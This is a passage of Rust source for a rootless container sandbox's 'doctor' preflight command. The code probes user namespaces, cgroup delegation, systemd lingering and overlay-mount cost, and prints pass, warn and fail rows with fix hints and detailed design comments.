//! `kern doctor` - a rootless-sandbox preflight. Answers "will `kern box` work on this machine, and
//! which optional features are available?" with PASS / WARN / FAIL lines and a fix hint for each.
//!
//! It takes no privilege, and it reads rather than changes the environment (sysctls, `/proc`,
//! `/sys`, `PATH`). Three checks do more than read, and they are named here rather than discovered
//! in a trace: the userns check performs one real unprivileged-userns self-test, the scope-toll
//! check times three `systemd-run --user --scope /bin/true`, and the memory-cap check creates a
//! `kern-capprobe-<pid>` cgroup, writes THAT CHILD's own `memory.max` and removes it, because the
//! only way to answer "does a cap bind here?" is to try to make one bind. It never touches an
//! existing box's limits. The GPU check is the read-only kind: it opens no file for writing by
//! construction, and `pentest-gpu-claims.sh` case A8 confirms that against strace wherever the suite
//! runs, which so far is one x86 host. The property belongs to the code; the strace is one machine
//! agreeing with it.
//!
//! FAIL = boxes won't run; WARN = an optional feature is degraded/unavailable but the core sandbox
//! still works.

use crate::error::Error;
use crate::ui::Palette;

/// One check outcome.
enum R {
    /// message, note (may be empty). The note prints on its own dim line, exactly as the hint
    /// of a `Warn` does. It exists because it did not: a qualification that could not be a second
    /// line was written into a parenthesis on the first, and two rows reached 169 and 181 characters
    /// while every `!` row stayed under 70. The shape of the type was deciding the prose.
    Ok(String, String),
    Warn(String, String), // message, hint
    Fail(String, String),
}

impl R {
    /// A passing row whose verdict says the whole thing.
    fn ok(msg: String) -> R {
        R::Ok(msg, String::new())
    }

    /// A passing row with a qualification that belongs on its own line.
    ///
    /// The line above the note answers `doctor`'s question and is read first; the note is what a
    /// reader needs only if they are deciding something. Both were previously one line joined by a
    /// parenthesis, and that line does not fit a terminal.
    fn ok_note(msg: &str, note: &str) -> R {
        R::Ok(msg.to_string(), note.to_string())
    }
}

/// What the per-box `systemd-run --user --scope` actually costs on THIS host, and how to stop paying
/// it once per box.
///
/// kern caps directly in its own delegated `kern.slice` when it is ALREADY inside the systemd USER
/// manager's tree. A desktop session puts it there; an **SSH login does not** - sshd places the session
/// under the SYSTEM manager in a different delegation domain, and cgroup v2 will not migrate a process
/// across that boundary (the common ancestor, `user-<uid>.slice`, is not the user's to write; verified
/// on an Arduino UNO Q: creating the child cgroup and writing `memory.max` both succeed, writing the
/// pid into `cgroup.procs` is refused). So on a headless board kern falls back to one transient scope
/// PER BOX, and that is the whole board-vs-desktop gap.
///
/// The toll is MEASURED, not described, because a guess would be wrong by an order of magnitude: one
/// `systemd-run --user --scope /bin/true` costs ~4 ms on an x86 desktop, ~9 ms on a Raspberry Pi 5 and
/// ~39 ms on the UNO Q's Android kernel. Costs one process, and only on a host already paying far more
/// than that per box.
///
/// Reported as a FLOOR ("at least"), which is what it is. A box does not merely create the scope, it
/// re-execs kern inside it, so the real per-box difference is larger than the bare `systemd-run`:
/// on the UNO Q this measures 38.6 ms while the capped-minus-uncapped box gap is 58.2. Quoting the
/// bare number as though it were the whole cost would understate it by a third, in the same way the
/// cold first sample used to overstate it by 3.6x.
///
/// Read-only, as this module promises: the branch is decided from `/proc/self/cgroup`, not by calling
/// `direct_caps_available()`, which would CREATE the slice as a side effect.
fn check_scope_toll() -> R {
    let uid = unsafe { libc::getuid() };
    let mine = std::fs::read_to_string("/proc/self/cgroup").unwrap_or_default();
    // Inside `user@<uid>.service` = inside the user manager's tree = kern caps directly, no toll.
    if mine.contains(&format!("/user@{uid}.service/")) {
        return R::ok("caps go direct into kern.slice: no per-box systemd round trip".into());
    }
    if !kern_isolation::user_systemd_present() {
        // No user manager means no transient scope to pay for, which on WSL2 is why a box costs 4.2 ms
        // there WITH its cap enforced: the direct path was never optional, it was the only one.
        //
        // The same fact leaves a colima guest UNCAPPED, and this row said only the good half of it: a
        // tester read a green "no scope is paid at all" one line under a warning that caps do not
        // bind and reported the two as a contradiction. They are one fact with two consequences, so
        // say both and point at the row that decides. Deliberately still a tick and NOT a second
        // warning: the cgroup row above already carries the warning, and duplicating it would make a
        // single problem look like two. This row costs no probe, which is what its doc promises.
        return R::ok_note(
            "no systemd user manager here: no per-box scope is paid",
            "and none is available to delegate a cap through either - whether caps bind is the \
             cgroup row above",
        );
    }
    // THREE runs, report the median, and throw the first away. A single cold sample read 34.0 ms on a
    // Raspberry Pi 5 where the warm median is 9.4: the first `systemd-run` in a session pays for the
    // user manager's own wake-up, not for the scope. Quoting the cold number would overstate the toll
    // by 3.6x, and a benchmark this row exists to justify cannot be the sloppiest number on screen.
    let once = || -> Option<f64> {
        let t0 = std::time::Instant::now();
        let ok = std::process::Command::new("systemd-run")
            .args(["--user", "--scope", "--quiet", "/bin/true"])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false);
        ok.then(|| t0.elapsed().as_secs_f64() * 1000.0)
    };
    // One message, one place. It was written twice for the two ways the timing can come back empty,
    // which is the duplicated-derived-condition rule broken in the function that measures it.
    const NO_SCOPE: &str = "caps take the best-effort path (no usable systemd --user scope)";
    if once().is_none() {
        return R::ok(NO_SCOPE.into());
    }
    let s: Vec<f64> = (0..3).filter_map(|_| once()).collect();
    if s.is_empty() {
        return R::ok(NO_SCOPE.into());
    }
    // THE RUNS STILL GATE THIS ROW; THE SORT DID NOT SURVIVE THE FIGURE. Reaching a scope four
    // times is what says one is really available here, and `s` coming back empty is the second way
    // this row does not fire. The `sort_by` that stood here existed only to take the median for
    // printing, and the printing went on 2026-09-22: a figure in an advisory line ages, cannot
    // carry its method, and is not what the reader acts on. The action is the command, and the
    // command is the same whether the toll is 4 ms or 40. Per-host numbers belong in BENCHMARKS.md,
    // beside the machine and the method, which is the only place a figure means anything.
    R::Warn(
        "this session is outside the systemd user manager, so every box pays a transient scope"
            .into(),
        // AND THE TWO CONSEQUENCES THAT ARE NOT ABOUT SPEED, because this row is the only place they
        // are reachable. The same boundary that costs a transient scope per box also stops `kern
        // exec` joining a box's cgroup: cgroup v2 delegation containment needs write access to the
        // `cgroup.procs` of the COMMON ANCESTOR, and from outside the user manager's tree that is the
        // root cgroup. So `kern exec` refuses, and the refusal points HERE to tell the two causes
        // apart. An outside independent test, on WSL2 with `systemd=true`, reported that the pointer resolved
        // to a row which did not name the way through; this is that gap.
        //
        // The health probe is named for the opposite reason: it does NOT refuse, it runs outside the
        // box's caps, and its own stderr is unreadable (measured: the detached supervisor's stdout
        // and stderr are one pipe nobody reads, and the box log stays 0 bytes). A consequence that
        // cannot announce itself where it happens has to be announced where it can be read.
        // SHORT ON PURPOSE, AND HELD TO THREE FACTS. This was a 586-character paragraph carrying
        // two measurements taken on OTHER machines (`91.9 -> 35.5` on an Arduino UNO Q,
        // `11.7 -> 3.0` on a Raspberry Pi 5) and the phrase "the direct kern.slice path". Read on
        // WSL by someone who had just installed kern, that is a debug dump about somebody else's
        // hardware: the boards say nothing on Windows and the implementation detail is not
        // something the reader acts on. A doctor row says what is wrong and what to type.
        //
        // WHAT IT MUST STILL NAME are `kern exec`, `KERN_ALLOW_UNCAPPED` and the health
        // probe, and a test holds it to them. The probe's reason is the one worth remembering: it
        // does NOT refuse, it runs outside the box's caps, and its own stderr goes nowhere
        // (measured: a marker written to fd 2 inside it appears in a foreground `kern exec` and not
        // in `kern logs`, whose file stays 0 bytes). A consequence that cannot announce itself
        // where it happens has to be announced where it can be read, and this is that place.
        //
        // What was cut instead: two measurements taken on OTHER machines (an Arduino UNO Q and a
        // Raspberry Pi 5), this host's own figure, and the phrase "the direct kern.slice path".
        // The boards say nothing to someone on WSL, the figure ages and cannot carry its method,
        // and the slice is an implementation detail the reader does not act on. 640 characters to
        // about 350, with all three facts still in it.
        "every box pays an extra startup cost here. Pay it once instead: \
         `systemd-run --user --scope bash`, then run kern in that shell. Caps are enforced either \
         way. On this host `kern exec` also refuses with 126 unless KERN_ALLOW_UNCAPPED=1 says the \
         uncapped command is intended (namespaces, seccomp and AppArmor still apply), and a \
         `--health-cmd` probe is never refused but runs outside the box's caps."
            .into(),
    )
}

/// Will a DETACHED box outlive the session that started it?
///
/// On a headless board this is the whole point of `-d`: ssh in, start a service, log out, expect it to
/// keep serving. It does not, by default. kern puts each box in a transient systemd scope under
/// `user@<uid>.service`, and when the last session of a user without **lingering** ends, systemd stops
/// that service and every scope under it. The box dies, its `/run/user/<uid>` runtime dir (where kern's
/// registry lives) is removed with it, and the next login finds no box, no port and no `kern logs`.
///
/// Measured on a Raspberry Pi 5 on 2026-08-01: a detached box publishing `0.0.0.0:8099` was gone 20 s
/// after the last ssh session closed, with nothing left running. After `loginctl enable-linger`, the
/// same box kept serving the page to another machine with no session open at all. Same cause, and the
/// same fix, as rootless podman, which documents it for exactly this reason.
///
/// Read from `/var/lib/systemd/linger/<user>`, which is where logind records it: a file test, no
/// subprocess, on a command a user runs when something is already wrong.
fn check_linger() -> R {
    // ORDER MATTERS, and getting it wrong printed a false reason. Ask "is there a manager at all?"
    // BEFORE "am I root?": on a WSL2 distro without systemd (`/proc/1/comm` = init, no
    // `/run/systemd/system`) the root branch below answered "boxes go to the system manager", naming
    // a manager that does not exist on that host. The conclusion was right and the reason was
    // invented, which is the one thing this codebase does not do. Measured on WSL2 (kernel
    // 6.18-microsoft-standard) on 2026-08-01.
    if !kern_isolation::user_systemd_present() {
        return R::ok(
            "no systemd manager here, so nothing stops a detached box when your session ends"
                .into(),
        );
    }
    // As real root kern drives the SYSTEM manager, so boxes are not under `user@<uid>.service` and
    // nothing about a login session can stop them. Decided by the SAME predicate that picks the
    // manager (`systemd_scope_mode`), not by re-deriving "am I root" here, so the two cannot drift.
    // Without this the check fired on every root host and told people to enable lingering for `root`,
    // which fixes nothing: measured on a Contabo VPS on 2026-08-01, a detached box as root was still
    // running with its port bound 30 s after every session had closed, lingering off throughout.
    if kern_isolation::systemd_scope_mode() == "--system" {
        return R::ok(
            "running as root: boxes go to the system manager, so a detached box is not tied to a login session".into(),
        );
    }
    let Some(user) = current_username() else {
        return R::ok("could not resolve the current user name to check systemd lingering".into());
    };
    if std::path::Path::new(&format!("/var/lib/systemd/linger/{user}")).exists() {
        // LINGERING IS NECESSARY AND NOT SUFFICIENT for a stack to come back after a REBOOT, and
        // saying only the first half leaves a reader believing the second. Lingering starts the USER
        // MANAGER at boot; nothing in it starts a compose stack, because kern has no daemon that
        // owns one. The unit `kern compose <file> systemd` emits is what does, and it is the piece
        // a migration from Docker does not know it needs: there the daemon starts at boot and
        // restarts the containers itself.
        return R::ok_note(
            "systemd lingering is on: a detached box outlives the session that started it",
            "a compose STACK still needs its own unit to return after a reboot: \
             `kern compose <file> systemd`",
        );
    }
    R::Warn(
        "systemd lingering is OFF: a DETACHED box dies when your last session ends".into(),
        format!(
            "systemd stops `user@<uid>.service` and every box scope under it, and removes the \
             /run/user/<uid> registry with it (measured on a Raspberry Pi 5: box, port and \
             `kern logs` all gone 20 s after logout). It is also the first half of surviving a \
             REBOOT: without it the user manager does not start at boot, so a unit from \
             `kern compose <file> systemd` never runs. Fix: `sudo loginctl enable-linger {user}`, \
             one command, once per machine (the same requirement rootless podman documents)"
        ),
    )
}

/// The current user's login name, from the password database via `getpwuid`. `None` if the uid has no
/// entry (a container with no `/etc/passwd`), which is a reason to say nothing rather than guess.
fn current_username() -> Option<String> {
    // SAFETY: `getpwuid` returns a pointer into a static buffer owned by libc, read before any other
    // call that could overwrite it; a NULL return is the documented "no such user" and is checked.
    unsafe {
        let pw = libc::getpwuid(libc::getuid());
        if pw.is_null() || (*pw).pw_name.is_null() {
            return None;
        }
        std::ffi::CStr::from_ptr((*pw).pw_name)
            .to_str()
            .ok()
            .map(str::to_string)
    }
}

/// Every row `doctor` will print, in order, as a value.
///
/// Split out of [`doctor`] so a test can hold the WHOLE list rather than the handful of rows that
/// happen to have their own unit test. The one property that only the whole list has is shape: a row
/// that overflows the terminal is found by reading all of them at once, and reading them one at a
/// time is how two of them reached 169 and 181 characters.
fn rows() -> Vec<R> {
    let mut results: Vec<R> = vec![
        // Core: can we create an unprivileged user namespace at all?
        check_userns(),
        check_apparmor_userns(),
        // The other mandatory-access-control system, and the one this doctor had no line for. It was
        // written and never wired in, which `-D warnings` caught as dead code on main. AppArmor is
        // named in 157 places here and SELinux was named in four, while the report that prompted it
        // came from Fedora, where AppArmor is not the LSM in force.
        check_selinux(),
        check_max_userns(),
        // Resource enforcement (cgroup v2 + delegation).
        check_cgroup(),
        check_scope_toll(),
        check_linger(),
        // Root filesystem strategy.
        check_overlay(),
        // Optional feature: multi-uid mapping.
        check_uid_range(),
    ];
    results.extend(check_gpu());
    results.extend(check_tools());
    results.push(check_kernel());
    results
}

pub fn doctor() -> Result<(), Error> {
    let p = Palette::detect();
    let results = rows();

    println!("{b}kern doctor{z}", b = p.b, z = p.z);
    let (mut ok, mut warn, mut fail) = (0u32, 0u32, 0u32);
    for r in &results {
        match r {
            R::Ok(m, n) => {
                ok += 1;
                println!("  {g}✔{z} {m}", g = p.g, z = p.z);
                if !n.is_empty() {
                    println!("      {d}{n}{z}", d = p.d, z = p.z);
                }
            }
            R::Warn(m, h) => {
                warn += 1;
                println!("  {y}!{z} {m}", y = p.y, z = p.z);
                if !h.is_empty() {
                    println!("      {d}{h}{z}", d = p.d, z = p.z);
                }
            }
            R::Fail(m, h) => {
                fail += 1;
                println!("  {r}✘{z} {m}", r = p.r, z = p.z);
                if !h.is_empty() {
                    println!("      {d}{h}{z}", d = p.d, z = p.z);
                }
            }
        }
    }
    println!();
    if fail == 0 {
        println!(
            "{g}ready{z} - {tally}. `kern box` will run here.",
            g = p.g,
            z = p.z,
            tally = tally(ok, warn, fail)
        );
        println!(
            "  {d}try it:{z} {b}kern box hello --image alpine -- echo 'hello from a box'{z}",
            d = p.d,
            b = p.b,
            z = p.z
        );
    } else {
        println!(
            "{r}not ready{z} - {tally}. Fix the ✘ items above.",
            r = p.r,
            z = p.z,
            tally = tally(ok, warn, fail)
        );
    }
    Ok(())
}

/// The count clause of the verdict line, the last thing `kern doctor` says and the one a reader
/// acts on.
///
/// Two things it does that the format string it replaced did not. It INFLECTS, because `1
/// warning(s)` is the register of a form letter and this is the first command somebody runs after
/// installing. And it DROPS A ZERO rather than spelling it out: `0 warnings` is a clause whose only
/// content is that there is nothing to say, and on the happy path it was two thirds of the line.
///
/// A function, and not three `format!`s at the call site, because the three counts appear in two
/// branches and the interesting cases (no warnings, several, a blocker) cannot ALL be produced on
/// any one host: this machine has exactly one warning and no blocker, so the other shapes would
/// ship unread. Here they are asserted instead.
fn tally(ok: u32, warn: u32, fail: u32) -> String {
    let s = |n: u32| if n == 1 { "" } else { "s" };
    let mut out = String::new();
    if fail > 0 {
        out.push_str(&format!("{fail} blocker{}, ", s(fail)));
    }
    out.push_str(&format!("{ok} ok"));
    if warn > 0 {
        out.push_str(&format!(", {warn} warning{}", s(warn)));
    }
    out
}

/// `kern info` - a compact, scriptable snapshot of the runtime + host: version, arch, kernel, cgroup
/// mode, userns status, and the runtime/cache/config paths kern uses. Read-only.
pub fn info() -> Result<(), Error> {
    let p = Palette::detect();
    let row = |k: &str, v: &str| println!("{d}{k:<16}{z} {v}", d = p.d, z = p.z);
    println!("{b}kern {}{z}", kern_common::VERSION, b = p.b, z = p.z);
    row("arch", std::env::consts::ARCH);
    row(
        "kernel",
        std::fs::read_to_string("/proc/sys/kernel/osrelease")
            .map(|s| s.trim().to_string())
            .unwrap_or_else(|_| "unknown".into())
            .as_str(),
    );
    let cgroup = if std::path::Path::new("/sys/fs/cgroup/cgroup.controllers").exists() {
        "v2 (unified)"
    } else if std::path::Path::new("/sys/fs/cgroup/memory").exists() {
        "v1 (legacy - caps best-effort)"
    } else {
        "none"
    };
    row("cgroup", cgroup);
    let userns = {
        let pid = unsafe { libc::fork() };
        if pid == 0 {
            let rc = unsafe { libc::unshare(libc::CLONE_NEWUSER) };
            unsafe { libc::_exit(if rc == 0 { 0 } else { 1 }) };
        }
        let mut st = 0i32;
        crate::eintr::waitpid(pid, &mut st, 0);
        libc::WIFEXITED(st) && libc::WEXITSTATUS(st) == 0
    };
    row("userns", if userns { "enabled" } else { "DISABLED" });
    if let Ok(d) = crate::registry::dir() {
        if let Some(parent) = d.parent() {
            row("runtime dir", &parent.to_string_lossy());
        }
    }
    row(
        "config",
        crate::config::active_path()
            .map(|p| p.to_string_lossy().into_owned())
            .unwrap_or_else(|| "-".into())
            .as_str(),
    );
    Ok(())
}

/// Does this kernel expose the cgroup-v2 CPU **bandwidth** interface (`cpu.max`), as opposed to only
/// the weight one (`cpu.weight`)? A `cpu` entry in `cgroup.controllers` answers "can this cgroup
/// distribute CPU", not "can it cap it": without `CONFIG_CFS_BANDWIDTH` the controller is present and
/// `cpu.max` is not, so a quota silently becomes a share.
///
/// Walks this process's own chain, since the file appears on a cgroup only once its parent enables the
/// controller. Best-effort and read-only: an unreadable `/proc/self/cgroup` returns `true`, because a
/// warning we cannot substantiate is worse than none.
fn cpu_bandwidth_interface_present() -> bool {
    let Ok(raw) = std::fs::read_to_string("/proc/self/cgroup") else {
        return true;
    };
    let Some(rel) = raw
        .lines()
        .find_map(|l| l.strip_prefix("0::"))
        .map(str::trim)
    else {
        return true;
    };
    let mut dir = std::path::PathBuf::from("/sys/fs/cgroup").join(rel.trim_start_matches('/'));
    loop {
        if dir.join("cpu.max").exists() {
            return true;
        }
        if !dir.pop() || !dir.starts_with("/sys/fs/cgroup") {
            return false;
        }
    }
}

/// Actually try to create an unprivileged user namespace in a throwaway child (so a failure can't
/// affect us) - more truthful than reading any single sysctl, which varies by distro (Debian's
/// `unprivileged_userns_clone`, Ubuntu's AppArmor gate, …). Returns whether it succeeded.
/// The cost of ONE overlay mount on this kernel, in milliseconds, or `None` if it could not be
/// measured.
///
/// Worth a doctor row because "overlayfs: available" hid an order of magnitude. On an Arduino UNO Q's
/// Android kernel one `mount -t overlay` costs ~28 ms against ~0.1 ms on x86, and it is a FIXED cost:
/// measured identical with a 517-file lowerdir and with an empty one, on ext4 and on tmpfs, and five
/// consecutive mounts in the same namespace all landed within 0.4 ms of each other. A cost that ignores
/// both the content and the backing store is not work being done, and the module is already loaded, so
/// it is not an autoload either. kern cannot make that kernel faster; it can stop the user guessing.
///
/// Timed INSIDE the child, after the namespace exists. Timing the whole `fork` + `unshare` + `uid_map`
/// round trip from the parent was the first attempt and it was useless: writing `uid_map` alone cost
/// 20 ms on one run and 5 on the next, so the warning appeared and vanished between two invocations on
/// a machine whose real overlay mount is 0.1 ms. A number that unstable must not gate a warning.
/// What the unprivileged-overlay probe found.
///
/// THE PROBE ALWAYS KNEW THIS AND THE ROW THREW IT AWAY. `overlay_mount_cost_ms` returned
/// `Option<f64>`, and every failure - including the mount being REFUSED - collapsed into `None`,
/// which `check_overlay` matched with `_ =>` and reported as `overlayfs: available`. So on a host
/// where an unprivileged overlay does not work, doctor printed a tick next to the exact capability
/// it had just proved absent, while `kern build` on the same host fell back to copying the base.
/// A field report hit that contradiction and could not tell which of the two was wrong.
///
/// The mount performed here is the same KIND the build needs: `CLONE_NEWUSER | CLONE_NEWNS`, mapped
/// to root inside, then `mount("overlay", ...)`. That is what makes its verdict transferable.
enum OverlayProbe {
    /// Mounted. Carries the median cost of one mount, in milliseconds.
    Works(f64),
    /// The mount itself was refused. This is the state `kern build` reports as
    /// `unprivileged overlay unavailable`.
    Refused,
    /// No user namespace, so the question could not be asked in the context that matters. Reported
    /// separately because the remedy is a different one, and `check_userns` names it already.
    NoUserns,
    /// The probe could not run or did not answer within its bounded wait. NOT a verdict: saying
    /// "unavailable" here would be inventing a fact from a failed measurement.
    Unknown,
}

fn overlay_probe() -> OverlayProbe {
    use std::os::unix::ffi::OsStrExt;
    const N: usize = 3;

    // EVERYTHING the child touches is built HERE, before the fork. After `fork()` in a process that
    // has threads, only async-signal-safe calls are legal: an allocation whose lock was held by
    // another thread at the instant of the fork deadlocks the child, and the parent then blocks in
    // `read()` on a pipe that will never be written. `kern doctor` would hang forever, and doctor is
    // the first command someone runs when something is already wrong. The child below does only
    // unshare / open / write / mount / write / _exit, plus `clock_gettime` via `Instant::now`, which
    // is on the POSIX async-signal-safe list. The median is computed in the parent.
    let dir = std::env::temp_dir().join(format!("kern-ovl-{}", std::process::id()));
    let _ = crate::commands::remove_tree_forced(&dir);
    for k in 0..N {
        for sub in ["lower", "upper", "work", "merged"] {
            if std::fs::create_dir_all(dir.join(k.to_string()).join(sub)).is_err() {
                let _ = crate::commands::remove_tree_forced(&dir); // never leave the tree we started
                return OverlayProbe::Unknown;
            }
        }
    }
    let (uid, gid) = unsafe { (libc::getuid(), libc::getgid()) };
    let uid_map = format!("0 {uid} 1\n");
    let gid_map = format!("0 {gid} 1\n");
    let mut targets: Vec<std::ffi::CString> = Vec::with_capacity(N);
    let mut optses: Vec<std::ffi::CString> = Vec::with_capacity(N);
    for k in 0..N {
        let base = dir.join(k.to_string());
        // An interior NUL cannot appear in a path this function built, so the `else` is unreachable
        // today. Handled anyway: a `?` here was the one place this function could return WITHOUT
        // removing the tree it had just created, which is a leak on a path nobody would ever see
        // fail.
        let (Some(t), Some(o)) = (
            std::ffi::CString::new(base.join("merged").as_os_str().as_bytes()).ok(),
            std::ffi::CString::new(format!(
                "lowerdir={0}/lower,upperdir={0}/upper,workdir={0}/work",
                base.display()
            ))
            .ok(),
        ) else {
            let _ = crate::commands::remove_tree_forced(&dir);
            return OverlayProbe::Unknown;
        };
        targets.push(t);
        optses.push(o);
    }

    let mut fds = [0i32; 2];
    if unsafe { libc::pipe(fds.as_mut_ptr()) } != 0 {
        let _ = crate::commands::remove_tree_forced(&dir);
        return OverlayProbe::Unknown;
    }
    let (rd, wr) = (fds[0], fds[1]);
    let pid = unsafe { libc::fork() };
    if pid == 0 {
        // ---- CHILD: no allocation past this line. ----
        unsafe { libc::close(rd) };
        if unsafe { libc::unshare(libc::CLONE_NEWUSER | libc::CLONE_NEWNS) } != 0 {
            unsafe { libc::_exit(1) };
        }
        // Map ourselves to root inside the namespace, as `unshare -r` does: without it the process is
        // the overflow uid, owns nothing, and every mount fails with EPERM - which is how this check
        // first measured nothing at all on the one board it exists for.
        let put = |path: &std::ffi::CStr, val: &str| -> bool {
            let fd = unsafe { libc::open(path.as_ptr(), libc::O_WRONLY) };
            if fd < 0 {
                return false;
            }
            let n = unsafe { libc::write(fd, val.as_ptr() as *const libc::c_void, val.len()) };
            unsafe { libc::close(fd) };
            n == val.len() as isize
        };
        let _ = put(c"/proc/self/setgroups", "deny");
        if !put(c"/proc/self/uid_map", &uid_map) || !put(c"/proc/self/gid_map", &gid_map) {
            unsafe { libc::_exit(2) };
        }
        // A fixed-size array, not a Vec: no allocation, and the parent does the sorting.
        let mut us = [0u64; N];
        for k in 0..N {
            let t0 = std::time::Instant::now();
            let rc = unsafe {
                libc::mount(
                    c"overlay".as_ptr(),
                    targets[k].as_ptr(),
                    c"overlay".as_ptr(),
                    0,
                    optses[k].as_ptr() as *const libc::c_void,
                )
            };
            if rc != 0 {
                unsafe { libc::_exit(3) };
            }
            us[k] = t0.elapsed().as_micros() as u64;
        }
        let bytes = unsafe {
            std::slice::from_raw_parts(us.as_ptr() as *const u8, N * std::mem::size_of::<u64>())
        };
        unsafe {
            libc::write(wr, bytes.as_ptr() as *const libc::c_void, bytes.len());
            libc::_exit(0)
        };
    }
    unsafe { libc::close(wr) };
    if pid < 0 {
        unsafe { libc::close(rd) };
        let _ = crate::commands::remove_tree_forced(&dir);
        return OverlayProbe::Unknown;
    }

    // A BOUNDED wait. Without it, any reason the child fails to write - a deadlock, a stop signal,
    // a kernel that hangs the mount - leaves doctor blocked with no output and no way out.
    let mut pfd = libc::pollfd {
        fd: rd,
        events: libc::POLLIN,
        revents: 0,
    };
    let ready = crate::eintr::poll(std::slice::from_mut(&mut pfd), 10_000) == 1;
    let mut buf = [0u8; N * 8];
    let n = if ready {
        unsafe { libc::read(rd, buf.as_mut_ptr() as *mut libc::c_void, buf.len()) }
    } else {
        unsafe { libc::kill(pid, libc::SIGKILL) };
        -1
    };
    unsafe { libc::close(rd) };
    let mut st = 0i32;
    crate::eintr::waitpid(pid, &mut st, 0);
    let _ = crate::commands::remove_tree_forced(&dir);
    if !libc::WIFEXITED(st) {
        return OverlayProbe::Unknown; // killed, including by this function's own timeout
    }
    if let Some(v) = exit_verdict(libc::WEXITSTATUS(st)) {
        return v;
    }
    if n != buf.len() as isize {
        return OverlayProbe::Unknown; // exited clean but the timings did not arrive
    }
    let mut us = [0u64; N];
    for (k, slot) in us.iter_mut().enumerate() {
        let mut w = [0u8; 8];
        w.copy_from_slice(&buf[k * 8..k * 8 + 8]);
        *slot = u64::from_ne_bytes(w);
    }
    us.sort_unstable();
    OverlayProbe::Works(us[N / 2] as f64 / 1000.0)
}

/// The overlay probe child's exit code, as a verdict. `None` for a clean exit, where the timings
/// it wrote decide instead.
///
/// THE CODE IS THE REASON, AND IT WAS BEING DISCARDED: every non-zero status collapsed into one
/// `None` that the row then read as "available". The numbers are the child's own `_exit` calls a few
/// dozen lines above, and `the_exit_codes_this_maps_are_the_ones_the_child_writes` holds the two
/// ends together, because a mapping keyed on constants written elsewhere is a mapping that goes
/// silently wrong the day somebody renumbers them.
const fn exit_verdict(code: i32) -> Option<OverlayProbe> {
    match code {
        0 => None,
        // `unshare(CLONE_NEWUSER | CLONE_NEWNS)` failed: no user namespace to ask the question in.
        1 => Some(OverlayProbe::NoUserns),
        // The uid/gid map could not be written, so the child never reached the mount. Not a verdict
        // about overlay: it never got to try.
        2 => Some(OverlayProbe::Unknown),
        // `mount("overlay", ...)` was refused. THE ANSWER the build acts on.
        3 => Some(OverlayProbe::Refused),
        // A code this function does not know cannot be turned into a fact about the kernel.
        _ => Some(OverlayProbe::Unknown),
    }
}

/// What the probe below found, because "can a user namespace be created" and "can a rootless box
/// run" turned out to be different questions.
#[derive(PartialEq, Debug, Clone, Copy)]
enum Userns {
    /// The whole sequence a rootless box needs.
    Works,
    /// `unshare(CLONE_NEWUSER)` itself was refused.
    NoNamespace,
    /// The namespace was created and the uid map could not be written. THE UBUNTU 24.04 DEFAULT:
    /// `kernel.apparmor_restrict_unprivileged_userns=1` permits the namespace and blocks denying
    /// setgroups for the rootless map, so a probe that stops at `unshare` reports success on a
    /// host where no box can start.
    NoMap,
}

/// Can a rootless box start here?
///
/// PROBED TO THE END, and it was not. This used to `unshare(CLONE_NEWUSER)` and call that the
/// answer, which is the same shape as asserting a binary exists rather than that it runs. Measured
/// on a stock Ubuntu 24.04 cloud image: `unshare` SUCCEEDS, `kern doctor` printed "unprivileged
/// user namespaces: enabled" and closed with "ready ... `kern box` will run here", and the command
/// it suggested failed with "unprivileged user namespaces are restricted here". Ubuntu is the most
/// common distribution kern is installed on, and that was its default state.
///
/// So the probe now does what a box does, in the same order: unshare, deny setgroups, write the
/// uid map. Each buffer is built BEFORE the fork, because the child must not allocate.
fn probe_userns() -> Userns {
    // `0 <uid> 1\n`, formatted here so the child only writes bytes.
    let uid_map = format!("0 {} 1\n", unsafe { libc::getuid() });
    let pid = unsafe { libc::fork() };
    if pid == 0 {
        unsafe {
            if libc::unshare(libc::CLONE_NEWUSER) != 0 {
                libc::_exit(1);
            }
            // Denying setgroups is what an unprivileged writer must do before the map, and it is
            // the step the AppArmor policy refuses.
            //
            // THE RESULT IS DROPPED FOR ONE CASE AND ONE ONLY: a kernel too old to have
            // `/proc/self/setgroups`, where the file is absent, the write fails, and the map write
            // below still succeeds because that kernel does not require the deny. There the answer
            // is `Works` and it is correct. Any other reason for this write to fail would also
            // fail the map write, which IS checked, so the verdict does not rest on this line. It
            // is dropped rather than handled because there is no third outcome to handle.
            let _ = write_bytes(c"/proc/self/setgroups".as_ptr(), b"deny");
            if !write_bytes(c"/proc/self/uid_map".as_ptr(), uid_map.as_bytes()) {
                libc::_exit(2);
            }
            libc::_exit(0);
        }
    }
    if pid < 0 {
        return Userns::NoNamespace;
    }
    // THE RETURN VALUE IS CHECKED, and discarding it was a false GREEN on a safety probe.
    // `waitpid` failing leaves `st` untouched at 0, and 0 is a VALID exit status: verified in C
    // on this host, `WIFEXITED(0) == 1` and `WEXITSTATUS(0) == 0`. So a reap that never happened
    // read as "the child exited cleanly", which this function maps to `Works` - "boxes run here"
    // on a host where the probe did not run at all.
    //
    // Reachable without anything exotic: any `SIGCHLD` handler that reaps, or another reaper in
    // the process, takes the status first and leaves this call returning -1/ECHILD. The function
    // exists because the previous probe reported ready on a host where nothing ran, so arriving
    // at the same answer through the wait would have been the same defect one syscall later.
    //
    // Anything but our own pid means we learned nothing, and "learned nothing" is the pessimistic
    // answer here, not the optimistic one.
    let mut st = 0i32;
    if crate::eintr::waitpid(pid, &mut st, 0) != pid {
        return Userns::NoNamespace;
    }
    if !libc::WIFEXITED(st) {
        return Userns::NoNamespace;
    }
    match libc::WEXITSTATUS(st) {
        0 => Userns::Works,
        2 => Userns::NoMap,
        _ => Userns::NoNamespace,
    }
}

/// `open`+`write`+`close` with no allocation, for use between `fork` and `_exit`.
///
/// # Safety
/// `path` must be a NUL-terminated C string. Called only in the forked child, where anything that
/// takes a lock or allocates could deadlock against a lock held by another thread at fork time.
unsafe fn write_bytes(path: *const libc::c_char, data: &[u8]) -> bool {
    let fd = unsafe { libc::open(path, libc::O_WRONLY) };
    if fd < 0 {
        return false;
    }
    let n = unsafe { libc::write(fd, data.as_ptr().cast(), data.len()) };
    unsafe { libc::close(fd) };
    n == data.len() as isize
}

/// The load-bearing check - the one that actually gates whether boxes run here.
fn check_userns() -> R {
    userns_verdict(probe_userns())
}

/// Pure, so the three states can be tested without a kernel that exhibits each one.
fn userns_verdict(probe: Userns) -> R {
    match probe {
        Userns::Works => R::ok("unprivileged user namespaces: enabled".into()),
        Userns::NoNamespace => R::Fail(
            "unprivileged user namespaces: DISABLED - kern boxes need them".into(),
